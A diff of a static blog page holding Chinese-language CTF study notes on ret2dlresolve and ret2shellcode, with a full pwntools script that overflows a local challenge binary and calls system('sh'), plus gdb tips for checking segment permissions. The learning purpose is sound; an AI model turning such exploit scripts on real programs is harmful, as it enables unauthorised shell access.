@@ -194,7 +194,15 @@
 </li>
 <li><p>pwnlib有ret2resolve的库，理解了用起来非常简单，所以再放一个用pwnlib库的代码</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个没有debug就行，自己写的时候就不行很离谱</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 不知道为啥，谁在ELF前面就不能用谁，比如这里不能用context.binary，要用elf </span></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line">rop = ROP(elf)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定要用system函数，产生调用system函数的payload</span></span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf, symbol=<span class="string">&#x27;system&#x27;</span>, args=[<span class="string">&#x27;sh&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定要用的input函数（这个程序里用的read我们就用read，用get的话我们就用get），帮我们把payload读进内存</span></span><br><span class="line">rop.read(<span class="number">0</span>, dlresolve.data_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动帮助我们加入栈平衡gadget，调用plt[0] with改写过的reloc index which指向我们payload地址</span></span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line"></span><br><span class="line">raw_rop = rop.chain()</span><br><span class="line">print(rop.dump())</span><br><span class="line">p = elf.process()</span><br><span class="line">p.sendline(fit(&#123;<span class="number">112</span>: raw_rop&#125;))</span><br><span class="line">p.sendline(dlresolve.payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>​    所以用pwnlib的话，可以看到我们要做的事只有指定我们要调用的dll函数（比如system）和参数，指定可以让我们输入payload的函数（比如read，因为这题输入用的是read），自己看下栈溢出的padding是多少就没了，其它事pwnlib都帮我们做了</p>
+<p>所以用pwnlib的话，可以看到我们要做的事只有指定我们要调用的dll函数（比如system）和参数，指定可以让我们输入payload的函数（比如read，因为这题输入用的是read），自己看下栈溢出的padding是多少就没了，其它事pwnlib都帮我们做了</p>
+</li>
+<li><p>在看ctf-wiki ret2shellcode（把shellcode写到一个可执行的段并return到那里，举的题例里面bss段是可执行的）的时候，我在想如果bss段可执行，那还用什么ret2dlresolve，直接把shellcode写到bss上返回到那儿不就行了，后来才发现bss本身一般是rw-的，可读可写但不可执行，所以ret2dlresolve依然是个宝贝。</p>
+<p>这里学到两个gdb命令可以帮我们看虚拟内存中每个段的permission flag</p>
+<ul>
+<li>info files查看每个段在虚拟内存中的地址</li>
+<li>vmmap查看地址的permission flag</li>
+</ul>
+<p>看过正常编译的程序之后就知道，一般text段是r-x，bss段是rw-，而且没有任何一个段同时有rwx。所以再遇到checksec里有说has rwx segments的时候，就应该想到会不会是ret2shellcode，因为我们可以先写到rwx段上再去那里执行</p>
 </li>
 </ul>
 
@@ -1069,7 +1077,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">Leetcode</a>
+                <a href="javascript:void(0)" class="js-tag color4">Research</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1077,15 +1085,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">Research</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Reverse Engineering</a>
+                <a href="javascript:void(0)" class="js-tag color4">Leetcode</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">Review</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Reverse Engineering</a>
               </li>
              
               <li class="article-tag-list-item">
